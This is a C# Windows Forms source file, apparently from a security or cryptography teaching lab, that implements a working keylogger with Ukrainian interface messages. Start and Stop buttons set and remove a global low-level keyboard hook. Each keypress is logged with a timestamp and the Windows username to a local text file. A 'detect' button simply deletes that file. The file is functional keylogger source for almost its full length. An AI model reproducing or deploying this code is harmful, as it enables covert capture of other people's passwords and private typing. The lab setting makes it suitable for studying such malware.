using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace CryptoLabApp.Forms
{
    public partial class KeyloggerForm : Form
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logFile = "keylog.txt";

        public KeyloggerForm()
        {
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            _hookID = SetHook(_proc);
            MessageBox.Show("Клавіатурний шпигун запущено!");
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            UnhookWindowsHookEx(_hookID);
            MessageBox.Show("Клавіатурний шпигун зупинено!");
        }

        private void btnDetect_Click(object sender, EventArgs e)
        {
            if (File.Exists(logFile))
            {
                File.Delete(logFile);
                MessageBox.Show("Лог клавіатурного шпигуна виявлено та видалено!");
            }
            else
            {
                MessageBox.Show("Лог клавіатурного шпигуна не знайдено!");
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string log = $"{DateTime.Now} - Користувач: {Environment.UserName} - Клавіша: {(Keys)vkCode}";
                File.AppendAllText(logFile, log + Environment.NewLine);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}